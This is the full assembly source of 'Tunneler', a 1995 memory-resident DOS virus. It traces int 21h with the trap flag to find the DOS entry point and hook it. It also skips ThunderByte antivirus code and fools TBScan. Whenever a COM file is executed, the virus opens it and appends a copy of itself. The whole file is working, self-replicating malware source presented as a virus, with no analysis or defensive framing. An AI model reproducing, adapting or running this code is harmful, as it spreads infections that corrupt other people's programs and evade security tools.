;  Tunneler - written by Conzouler/IR 1995
;
;  Based on the Rather Small Virus (refer to RSV.ASM for details).
;  Tunneling and intersegmentary hooking added.
;  Thanks to TU for supplying ideas and concepts and
;  further credits goes to Satan's little helper!

;  Features:
;  memory resident
;  com-append on execute
;  no tb-flags (of course)
;  tunnels to find dos entry point
;  chains in first in the int21 chain
;

.model tiny
.code
 org 100h

psize   equ     (offset last - offset entry) / 10h + 2
size    equ     offset last - offset entry

entry:
        db      0e9h,0,0                        ; Initial jump
start:
        call    gores

oentry  db      0CDh,20h,90h

gores:
        mov     ax, 4277h                       ; Installation check
        int     21h
        jnc     restore

        mov     ah, 4Ah                         ; Get size of memory block
        mov     bx, 0FFFFh
        int     21h
        mov     ah, 4Ah                         ; Change size of memory
        sub     bx, psize+1                     ; Make space for virus
        int     21h
        mov     ah, 48h                         ; Allocate memory
        mov     bx, psize
        int     21h
        sub     ax, 10h                         ; Compensate org 100h
        mov     es, ax
        mov     di, 103h
        mov     si, sp                          ; Get entry point
        mov     si, [si]
        sub     si, 3                           ; Subtract first call
        mov     cx, size-3
        rep     movsb                           ; Copy virus to new memory
        push    es
        pop     ds
        inc     byte ptr ds:[0F1h]              ; Change block owner

        push    cs
        call    gotun                           ; Jump to tunneler

restore:
        mov     di, 100h                        ; Offset to program entry
        push    cs                              ; Set es and ds to psp
        pop     ds
        push    ds
        pop     es
        pop     si                              ; Get entry point
        push    di                              ; Prepare jump to 100h
        movsw                                   ; Restore program entry point
        movsb
        retn                                    ; Jump to 100h


gotun:
        push    ds                              ; Jump to tunneler in
        mov     ax, offset tunneler             ; new memory
        push    ax
        retf

tunneler:
        mov     ah,52h                          ; Get list of lists
        int     21h
        mov     ax, es:[bx-2]                   ; Get first MCB
        mov     fmcb, ax

        mov     ax, 3521h                       ; Get int21
        int     21h
        mov     i21o, bx
        mov     i21s, es

        mov     al, 01h                         ; Save int01
        int     21h
        push    bx                              ; on stack
        push    es

        mov     ah, 25h                         ; Set int01
        mov     dx, offset vec01
        int     21h

        pushf                                   ; Set trap flag
        pop     ax
        or      ah,1
        push    ax
        popf

        mov     ah,0Bh                          ; Issue dos function
        pushf                                   ; Simulate interrupt
        call    dword ptr i21o                  ; for tracing

        pop     ds
        pop     dx

        pushf                                   ; Get flags
        pop     ax
        test    ah, 1                           ; Check trap flag
        pushf
        and     ah, 0FEh                        ; Turn off trap flag
        push    ax
        popf

        mov     ax, 2501h                       ; Reset int01
        int     21h

        push    cs
        pop     ds

        popf
        jnz     chained

        mov     ah, 25h
        mov     dx, offset vec21
        int     21h

chained:
        retf


vec01:
        mov     cs:savedax, ax                  ; Save registers
        mov     cs:savedsi, si
        mov     cs:savedcx, cx
        pop     si                              ; Get ip in si
        pop     ax                              ; cs in ax
        pop     cx                              ; flags in cx
        push    ds
        mov     ds, ax
        cmp     word ptr [si], 05EBh            ; Check if tbav
        jne     chaincheck
        cmp     byte ptr [si+2], 0EAh           ; Check if tbav
        jne     chaincheck
        inc     si                              ; Skip tbav
        inc     si
chaincheck:
        cmp     byte ptr [si], 09Ah             ; Immediate interseg?
        je      chainis
        cmp     byte ptr [si], 0EAh             ; Immediate interseg?
        je      chainis
        cmp     word ptr [si], 0FF2Eh           ; opc prefix=cs?
        jne     traceexit
        cmp     byte ptr [si+2], 01Eh           ; Direct interseg?
        je      chainds
        cmp     byte ptr [si+2], 02Eh           ; Direct interseg?
        je      chainds
traceexit:
        pop     ds
        push    cx
        push    ax
        push    si
        db      0B8h
savedax dw      ?
        db      0BEh
savedsi dw      ?
        db      0B9h
savedcx dw      ?
        iret

chainis:
        push    si
        inc     si
        jmp     chain
chainds:
        push    si
        mov     si, si[3]
chain:
        db      81h,7Ch,02h                     ; cmp    ds:si[2], fmcb
fmcb    dw      ?                               ; See if jump is to dos
        jnb     chainexit
        push    ax
        mov     ax, si[0]                       ; Get offset address
        mov     cs:i21o, ax
        mov     ax, si[2]                       ; Get segment address
        mov     cs:i21s, ax
        mov     si[0], offset vec21             ; Install vec21
        mov     si[2], cs
        pop     ax
        and     ch, 0FEh                        ; Clear trap flag
chainexit:
        pop     si
        jmp     traceexit


vec21:
        cmp     ax, 4277h                       ; Installation check
        jne     v21e
        iret
v21e:   cmp     ax, 4B00h                       ; Execute program
        je      infect

v21x:   db      0EAh                            ; Jump to dos vector
i21o    dw      ?
i21s    dw      ?


infect:
        push    ax
        push    bx
        push    cx
        push    dx
        push    ds

        mov     ax, 3D82h                       ; Open file
        int     21h
        xchg    ax, bx                          ; Put handle in bx

        push    cs                              ; Read first bytes
        pop     ds                              ; to oentry
        mov     ah, 3Fh
        mov     dx, offset oentry
        mov     cx, 3
        int     21h
        cmp     byte ptr oentry, 'M'            ; Check if exe file
        je      infectx
        push    cx

        mov     ax, 4202h                       ; Seek to eof
        xor     cx, cx
        cwd                                     ; Zero dx
        int     21h
        sub     ax, 3                           ; Get offset to eof
        mov     word ptr entry[1], ax           ; Save as jump
        xchg    dx, ax
        mov     ax, 4200h
        int     21h
        mov     ah, 3Fh                         ; Infection check
        mov     dx, offset last
        pop     cx
        int     21h
        cmp     byte ptr last[1], 0EBh          ; Check if infected
        je      infectx

        mov     byte ptr entry, 0E9h            ; Create jump opcode

        mov     ah, 3Fh                         ; Append virus
        inc     ah                              ; Fool TBScan
        push    ax
        mov     dx, 103h
        mov     cx, size-3
        int     21h

        mov     ax, 4200h                       ; Insert jump
        xor     cx, cx
        cwd
        int     21h

        pop     ax
        mov     dh, 1h                          ; 100h in dx
        mov     cl, 3                           ; 3 in cx
        int     21h
infectx:
        mov     ah, 3Eh
        int     21h

        pop     ds
        pop     dx
        pop     cx
        pop     bx
        pop     ax
        jmp     v21x


last:
end     entry

